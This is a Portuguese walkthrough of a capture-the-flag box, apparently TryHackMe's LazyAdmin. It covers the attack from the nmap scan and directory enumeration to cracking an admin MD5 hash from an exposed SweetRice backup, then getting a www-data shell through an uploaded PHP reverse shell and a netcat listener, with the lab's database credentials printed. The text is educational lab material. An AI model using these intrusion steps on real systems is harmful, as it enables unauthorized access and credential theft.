Escaneamento a máquina me retornou 2 portas

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 13:40 -03
Nmap scan report for 10.10.123.131
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/8%OT=22%CT=1%CU=32247%PV=Y%DS=2%DC=I%G=Y%TM=6227870E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11
OS:NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.88 seconds
```

Utilizei então o dirb e o dirbuster para identificar diretórios escondidos.

Achei o ```http://10.10.123.131/content/```

Abri a segunda página, então ```http://10.10.123.131/content/_themes/ ```

```
category|cat.php
sidebar|sidebar.php
foot|foot.php
head|head.php
home|main.php
sitemap|sitemap.php
tags|tags.php
entry|entry.php
show_comment|show_comment.php
comment_form|comment_form.php
css|css/app.css
```

E então eu fui para a página ```http://10.10.123.131/content/as/``` onde eu vi o sistema de login

Vi que eram apenas arquivos da página, tanto php como js. Por isso, decidi tentar procurar por um sploit do sistema

```
┌──(root㉿kali)-[/home/ellie]
└─# searchsploit sweetrice                                            
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                          | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                       | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                        | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                          | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                              | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                     | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                            | php/webapps/14184.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Analisei alguns diretórios dos sites e verifiquei que havia um arquivo em MySQL_Backup que possuia a seguinte string quando a abri:

```
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

e possui a seguinte passagem:

```
"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
```

```
"admin\\";s:7:\\"manager\\
```

Utilizei o hash-identifier para ver qual a provável hash dessa senha:

```
┌──(root㉿kali)-[/home/ellie/Desktop]
└─# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 42f749ade7f9e195bf475f37a44cafcb

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
```

Descobri ser a MD5 e usei o john the ripper para quebrar essa hash

```
┌──(root㉿kali)-[/home/ellie/Desktop]
└─# john --format=Raw-MD5 pass.txt --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2022-04-21 21:19) 7.692g/s 259938p/s 259938c/s 259938C/s coco21..redlips
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Após logar, comecei a procurar por arquivos na página que me dessem algum indício ou algo que poderia utilizar.

Informações conquistadas:
- LazyAdmin parece residir em Los Angeles EUA
- Banco de dados
	- Database : mysql
	- Database Host : localhost
	- Database Port : 3306
	- Database Account : rice
	- Database Password : randompass
	- Database Name: website
	- Database Prefix: v
	- Tables:
		-  v_attachment
		- v_category
		- v_comment
		- v_item_data
		- v_item_plugin
		- v_links
		- v_options
		- v_posts
- ![[Pasted image 20220423124056.png]]
- Descobri também um local para rodar script .php. Com isso, utilizei um script pronto do [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), que havia um arquivo próprio para isso. Utilizei, apenas alterando o ip e a porta.

Rodei o netcat usando o ```nc -lvp 443``` e o seguinte apareceu: ``listening on [any] 443 ...``

O meu netcat estava escutando a porta especificada, mas ainda não estava conectado.

Ao colocar o reverse shell no site, fui até a página que tinha os arquivos ```http://10.10.221.68/content/inc/ads/``` e cliquei no shell.php para executa-lo. A página no netcat me deu a seguinte resposta:

```
10.10.221.68: inverse host lookup failed: Unknown host
connect to [10.9.1.163] from (UNKNOWN) [10.10.221.68] 59684
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 20:08:18 up  1:41,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

Entrei na máquina. Comecei a fazer reconhecimento na máquina.

Informações coletadas a partir dos comandos neste [link](https://www.tecmint.com/commands-to-collect-system-and-hardware-information-in-linux/):

|User    |System |Network hostname|Kernel version                                     |
|--------|-------|----------------|---------------------------------------------------|
|www-data|Linux  |THM-Chal        |#79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019|
- Kernel release: 4.15.0-70-generic
- Machine hardware name: i686

Encontrei nos arquivos do usuário a senha para o banco mysql:
```rice:randompass``` estava em um arquivo denominado mysql_login.txt que estava localizado em ``/home/itguy``. Junto disso, vi um arquivo txt que quando abri estava a primeira flag do desafio. Vi também mais um arquivo chamado examples.desktop que continha a seguinte informação:

```
[Desktop Entry]
Version=1.0
Type=Link
Name=Examples
Name[aa]=Ceelallo
Name[ace]=Contoh
Name[af]=Voorbeelde
Name[am]=ምሳሌዎች
Name[an]=Exemplos
Name[ar]=أمثلة
Name[ast]=Exemplos
Name[az]=Nümunələr
Name[be]=Прыклады
Name[bg]=Примери
Name[bn]=উদহরণ
Name[br]=Skouerioù
Name[bs]=Primjeri
Name[ca]=Exemples
Name[ca@valencia]=Exemples
Name[ckb]=نمونهكان
Name[cs]=Ukázky
Name[csb]=Przëmiôrë
Name[cy]=Enghreifftiau
Name[da]=Eksempler
Name[de]=Beispiele
Name[dv]=މސލތށ
Name[el]=Παραδείγματα
Name[en_AU]=Examples
Name[en_CA]=Examples
Name[en_GB]=Examples
Name[eo]=Ekzemploj
Name[es]=Ejemplos
Name[et]=Näidised
Name[eu]=Adibideak
Name[fa]=نمونهها
Name[fi]=Esimerkkejä
Name[fil]=Mga halimbawa
Name[fo]=Dømir
Name[fr]=Exemples
Name[fur]=Esemplis
Name[fy]=Foarbylden
Name[ga]=Samplaí
Name[gd]=Buill-eisimpleir
Name[gl]=Exemplos
Name[gu]=દષટનત
Name[gv]=Sampleyryn
Name[he]=דוגמאות
Name[hi]=उदहरण
Name[hr]=Primjeri
Name[ht]=Egzanp
Name[hu]=Minták
Name[hy]=Օրինակներ
Name[id]=Contoh
Name[is]=Sýnishorn
Name[it]=Esempi
Name[ja]=サンプル
Name[ka]=ნიმუშები
Name[kk]=Мысалдар
Name[kl]=Assersuutit
Name[km]=ឧទហរណ
Name[kn]=ಉದಹರಣಗಳ
Name[ko]=예시
Name[ku]=Mînak
Name[kw]=Ensamplow
Name[ky]=Мисалдар
Name[lb]=Beispiller
Name[lt]=Pavyzdžių failai
Name[lv]=Paraugi
Name[mg]=Ohatra
Name[mhr]=Пример-влак
Name[mi]=Tauira
Name[mk]=Примери
Name[ml]=ഉദഹരണങങള
Name[mr]=उदहरण
Name[ms]=Contoh-contoh
Name[my]=ဥပမမ
Name[nb]=Eksempler
Name[nds]=Bispelen
Name[ne]=उदहरणहर
Name[nl]=Voorbeeld-bestanden
Name[nn]=Døme
Name[nso]=Mehlala
Name[oc]=Exemples
Name[pa]=ਉਦਹਰਨ
Name[pl]=Przykłady
Name[pt]=Exemplos
Name[pt_BR]=Exemplos
Name[ro]=Exemple
Name[ru]=Примеры
Name[sc]=Esempiusu
Name[sco]=Examples
Name[sd]=مثالون
Name[se]=Ovdamearkkat
Name[shn]=တဝယင
Name[si]=නදසන
Name[sk]=Príklady
Name[sl]=Zgledi
Name[sml]=Saga Saupama
Name[sn]=Miyenzaniso
Name[sq]=Shembujt
Name[sr]=Примери
Name[sv]=Exempel
Name[sw]=Mifano
Name[szl]=Bajszpile
Name[ta]=உதரணஙகள
Name[ta_LK]=உதரணஙகள
Name[te]=ఉదహరణల
Name[tg]=Намунаҳо
Name[th]=ตวอยาง
Name[tr]=Örnekler
Name[tt]=Мисаллар
Name[ug]=مىساللار
Name[uk]=Приклади
Name[ur]=مثالیں
Name[uz]=Намуналар
Name[vec]=Esempi
Name[vi]=Mẫu ví dụ
Name[wae]=Bischbil
Name[zh_CN]=示例
Name[zh_HK]=範例
Name[zh_TW]=範例
Comment=Example content for Ubuntu
Comment[aa]=Ubuntuh addattinoh ceelallo
Comment[ace]=Contoh aso ke Ubuntu
Comment[af]=Voorbeeld inhoud vir Ubuntu
Comment[am]=ዝርዝር ምሳሌዎች ለ ኡቡንቱ
Comment[an]=Conteniu d'exemplo ta Ubuntu
Comment[ar]=أمثلة محتوى لأوبونتو
Comment[ast]=Conteníu del exemplu pa Ubuntu
Comment[az]=Ubuntu üçün nümunə material
Comment[be]=Узоры дакументаў для Ubuntu
Comment[bg]=Примерно съдържание за Ubuntu
Comment[bn]=উবনট সকরনত নমন তথয
Comment[br]=Skouerenn endalc'had evit Ubuntu
Comment[bs]=Primjer sadrzaja za Ubuntu
Comment[ca]=Continguts d'exemple per a l'Ubuntu
Comment[ca@valencia]=Continguts d'exemple per a l'Ubuntu
Comment[ckb]=نموونەی ناوەڕۆکێک بۆ ئوبوونتو
Comment[cs]=Ukázkový obsah pro Ubuntu
Comment[csb]=Przëmiôrowô zamkłosc dlô Ubuntu
Comment[cy]=Cynnwys enghraifft ar gyfer  Ubuntu
Comment[da]=Eksempel indhold til Ubuntu
Comment[de]=Beispielinhalt für Ubuntu
Comment[dv]=އބނޓ އއ އކށނ މސލތއ
Comment[el]=Παραδείγματα περιεχομένου για το Ubuntu
Comment[en_AU]=Example content for Ubuntu
Comment[en_CA]=Example content for Ubuntu
Comment[en_GB]=Example content for Ubuntu
Comment[eo]=Ekzempla enhavo por Ubuntu
Comment[es]=Contenido de ejemplo para Ubuntu
Comment[et]=Ubuntu näidisfailid
Comment[eu]=Adibidezko edukia Ubunturako
Comment[fa]=محتویات نمونه برای اوبونتو
Comment[fi]=Esimerkkisisältöjä Ubuntulle
Comment[fil]=Halimbawang laman para sa Ubuntu
Comment[fo]=Dømis innihald fyri Ubuntu
Comment[fr]=Contenu d'exemple pour Ubuntu
Comment[fur]=Contignûts di esempli par Ubuntu
Comment[fy]=Foarbyld fan ynhâld foar Ubuntu
Comment[ga]=Inneachar samplach do Ubuntu
Comment[gd]=Eisimpleir de shusbaint airson Ubuntu
Comment[gl]=Contido do exemplo para Ubuntu
Comment[gu]=Ubuntu મટ ઉદહરણ સચ
Comment[gv]=Stoo Sanpleyr son Ubuntu
Comment[he]=תוכן לדוגמה עבור אובונטו
Comment[hi]=उबनट हत उदहरण सरश
Comment[hr]=Primjeri sadržaja za Ubuntu
Comment[ht]=Kontni egzanplè pou Ubuntu
Comment[hu]=Mintatartalom Ubuntuhoz
Comment[hy]=Բովանդակության օրինակները Ubuntu֊ի համար
Comment[id]=Contoh isi bagi Ubuntu
Comment[is]=Sýnishorn fyrir Ubuntu
Comment[it]=Contenuti di esempio per Ubuntu
Comment[ja]=Ubuntuのサンプルコンテンツ
Comment[ka]=უბუნტუს სანიმუშო შიგთავსი
Comment[kk]=Ubuntu құжаттар мысалдары
Comment[kl]=Ubuntu-mut imarisaanut assersuut
Comment[km]=ឧទហរណសមរបអបបនធ
Comment[kn]=ಉಬಟಗ ಉದಹರಣಗಳ
Comment[ko]=우분투 컨텐츠 예시
Comment[ku]=Ji bo Ubuntu mînaka naverokê
Comment[ky]=Ubuntu-нун мисал документтери
Comment[lb]=Beispillinhalt fir Ubuntu
Comment[lt]=Įvairių dokumentų, paveikslėlių, garsų bei vaizdų pavyzdžiai
Comment[lv]=Parauga saturs Ubuntu videi
Comment[mg]=Ohatra ho an'i Ubuntu
Comment[mhr]=Ubuntu-лан документ-влакын пример-влак
Comment[mi]=Mata tauira o Ubuntu
Comment[mk]=Пример содржина за Убунту
Comment[ml]=ഉബണടവന വണടയളള ഉദഹരണങങള
Comment[mr]=उबटसठ घटकच उदहरण
Comment[ms]=Kandungan contoh untuk Ubuntu
Comment[my]=Ubuntu အတက နမန မတက
Comment[nb]=Eksempelinnhold for Ubuntu
Comment[ne]=उबनटक लग उदहरण समगर
Comment[nl]=Voorbeeldinhoud voor Ubuntu
Comment[nn]=Eksempelinnhald for Ubuntu
Comment[nso]=Mohlala wa dikagare tša Ubuntu
Comment[oc]=Exemples de contengut per Ubuntu
Comment[pa]=ਉਬਤ ਲਈ ਨਮਨ ਸਮਗਰ
Comment[pl]=Przykładowa zawartość dla Ubuntu
Comment[pt]=Conteúdo de exemplo para o Ubuntu
Comment[pt_BR]=Exemplo de conteúdo para Ubuntu
Comment[ro]=Conținut exemplu pentru Ubuntu
Comment[ru]=Примеры документов для Ubuntu
Comment[sc]=Esempiu de cabidu pro Ubuntu
Comment[sco]=Example content fur Ubuntu
Comment[sd]=اوبنٽو لاء مثال طور ڏنل مواد
Comment[shn]=တဝယငလမၼ တ Ubuntu
Comment[si]=උබනට සඳහ උදහරණ අනතරගතයන
Comment[sk]=Ukážkový obsah pre Ubuntu
Comment[sl]=Ponazoritvena vsebina za Ubuntu
Comment[sml]=Saupama Isina Ubuntu
Comment[sn]=Muyenzaniso wehuiswa kuitira Ubuntu
Comment[sq]=Shembull i përmbajtjes për Ubuntu
Comment[sr]=Садржај примера за Убунту
Comment[sv]=Exempelinnehåll för Ubuntu
Comment[sw]=Bidhaa mfano ya Ubuntu
Comment[szl]=Bajszpilnŏ treść dlŏ Ubuntu
Comment[ta]=உபணடவறகன எடததகடட உளளடககஙகள
Comment[ta_LK]=உபணடவறகன எடததகடட உளளடககஙகள
Comment[te]=Ubuntu వడక వధన నమనల
Comment[tg]=Мӯҳтавои намунавӣ барои Ubuntu
Comment[th]=ตวอยางขอมลสำหรบ Ubuntu
Comment[tr]=Ubuntu için örnek içerik
Comment[tt]=Ubuntu өчен документ мисаллары
Comment[ug]=ئۇبۇنتۇنىڭ مىساللىرى
Comment[uk]=Приклади контенту для Ubuntu
Comment[ur]=یوبنٹو کیلئے مثالی مواد
Comment[uz]=Ubuntu учун намуна таркиби
Comment[vec]=Contenuti de esempio de Ubuntu
Comment[vi]=Mẫu ví dụ cho Ubuntu
Comment[wae]=D'Ubuntu bischbildatijä
Comment[zh_CN]=Ubuntu 示例内容
Comment[zh_HK]=Ubuntu 的範例內容
Comment[zh_TW]=Ubuntu 的範例內容
URL=file:///usr/share/example-content/
Icon=folder
X-Ubuntu-Gettext-Domain=example-content
```

e encontrei um arquivo chamado backup.pl que continha a seguinte informação:

```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Locais para explorar depois na conexão com o itguy: lost+found, media, root, vmlinuz.